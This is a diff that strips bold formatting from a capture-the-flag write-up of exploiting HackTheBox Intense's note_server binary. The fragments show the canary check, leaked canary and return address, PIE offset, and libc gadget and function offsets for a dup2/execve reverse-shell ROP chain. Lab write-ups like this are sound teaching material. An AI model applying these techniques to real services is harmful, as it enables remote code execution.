@@ -573,15 +573,15 @@ Here is the code before the ret which will verify if the content of this QWORD i
 ```
 The code :
 ││ │╎   0x55f984d95de6      488b45f8       mov rax, qword [var_8h]
-│   ││ │╎   0x55f984d95dea      644833042528.  **xor rax, qword fs:[0x28]**
-│   ││┌───< 0x55f984d95df3      740c           **je 0x55f984d95e01**
+│   ││ │╎   0x55f984d95dea      644833042528.  xor rax, qword fs:[0x28]
+│   ││┌───< 0x55f984d95df3      740c           je 0x55f984d95e01
 │  ┌──────< 0x55f984d95df5      eb05           jmp 0x55f984d95dfc
 │  ││││││   ; CODE XREFS from sym.handle_client @ 0x55f984d95ce7, 0x55f984d95dc5
 │  │└└─└└─< 0x55f984d95df7      e9d3fdffff     jmp 0x55f984d95bcf
 │  │  │     ; CODE XREF from sym.handle_client @ 0x55f984d95df5
-│  └──────> 0x55f984d95dfc      e88ffbffff     **call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)**
+│  └──────> 0x55f984d95dfc      e88ffbffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
 │     └───> 0x55f984d95e01      c9             leave
-└           0x55f984d95e02      c3             **ret**
+└           0x55f984d95e02      c3             ret
 ```
 
 Binary compare the canary block from var_8h which "rbp-0x8" with the constant value of canary "fs:[0x28]"
@@ -626,7 +626,7 @@ gdb-peda$ pattern_create 255
 
 
 gdb-peda$ x/3xg $rbp-0x8 
-0x7fffffff8fb8:	**0x6e41412441414241**	0x41412d4141434141
+0x7fffffff8fb8:	0x6e41412441414241	0x41412d4141434141
 0x7fffffff8fc8:	0x413b414144414128
 ```
 
@@ -702,19 +702,19 @@ I'll use my leaked return address (RIP) to find the offset of the program base. 
 ```
 gdb-peda$ x/3xg $rbp-0x8
 0x7fffffff8fb8:	0xd0fe47edd3651300	0x00007fffffff90c0
-0x7fffffff8fc8:	**0X0000555555554f54**
+0x7fffffff8fc8:	0X0000555555554f54
 gdb-peda$ info proc mappings
 process 31711
 Mapped address spaces:
 
           Start Addr           End Addr       Size     Offset objfile
-      **0x555555554000**     0x555555556000     0x2000        0x0 /Lab/htb/Intense/note_server
+      0x555555554000     0x555555556000     0x2000        0x0 /Lab/htb/Intense/note_server
       0x555555755000     0x555555756000     0x1000     0x1000 /Lab/htb/Intense/note_server
       0x555555756000     0x555555757000     0x1000     0x2000 /Lab/htb/Intense/note_server
       0x555555757000     0x555555778000    0x21000        0x0 [heap]
       0x7ffff7dd7000     0x7ffff7df9000    0x22000        0x0 /lib/x86_64-linux-gnu/libc-2.28.so
-gdb-peda$ **p 0X0000555555554f54 - 0x0000555555554000**
-**$3 = 0xf54**
+gdb-peda$ p 0X0000555555554f54 - 0x0000555555554000
+$3 = 0xf54
 ```
 
 Here our return address is **0X0000555555554f54** and the and base address of program is  **0x555555554000** so the offset  **0xf54**  And because that offset is always the same. I can calculate for any run that the base address will be the leaked return address minus **0xf54**
@@ -773,22 +773,22 @@ The GOT address will hold the address of "write" in libc as it's loaded. That'
 #### Code 
 
 ```
-	     **# readelf -s remote_libc.so | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"**
+	     # readelf -s remote_libc.so | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"
               #999: 00000000001109a0    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
               #1491: 00000000000e4e30    33 FUNC    WEAK   DEFAULT   13 execve@@GLIBC_2.2.5
               #2246: 0000000000110140   153 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
 
 
-	     **# strings -a -t x remote_libc.so | grep -i "/bin/sh"**
+	     # strings -a -t x remote_libc.so | grep -i "/bin/sh"
 		# 1b3e9a /bin/sh
 
-	    **#  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rdi "**
+	    #  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rdi "
 	       # 0x0002155f: pop rdi ; ret  ;  (490 found)
 
-	    **#  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rsi"**
+	    #  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rsi"
 	       # 0x00023e6a: pop rsi ; ret  ;  (147 found)
 
-	    **#  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rdx"**
+	    #  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rdx"
 	       # 0x00001b96: pop rdx ; ret  ;  (6 found)
 
 	       write_offset_libc= 0x0000000000110140
@@ -816,7 +816,7 @@ Putting all of that together, i have the following code:
 
 The file descriptor number for the client where the reverse shell should redirect the (stdin,stdout,sterror)
 ```
-  0x0000555555554de8 <+654>:	**movzx  edx,WORD PTR [rbp-0x412]**
+  0x0000555555554de8 <+654>:	movzx  edx,WORD PTR [rbp-0x412]
    0x0000555555554def <+661>:	lea    rcx,[rbp-0x410]
    0x0000555555554e29 <+655>:	mov    eax,DWORD PTR [rbp-0x424]
    0x0000555555554e2f <+661>:	mov    rsi,rcx
@@ -830,7 +830,7 @@ Here the sock == file descriptor is the first argument of the function "write(so
 
 ```
 gdb-peda$ x/4b $rbp-0x424
-0x7fffffff8b9c:	**0x04**	0x00	0x00	0x00
+0x7fffffff8b9c:	0x04	0x00	0x00	0x00
 ```
 #### Code 
 
@@ -929,7 +929,7 @@ But we have a message after the handle_client() function like :
             close(sockfd);
             handle_client(newsockfd);
             char * end_msg = "Thanks for your visit !";
-            **write(newsockfd, end_msg,strlen(end_msg));**
+            write(newsockfd, end_msg,strlen(end_msg));
             exit(0);
         }
 ```
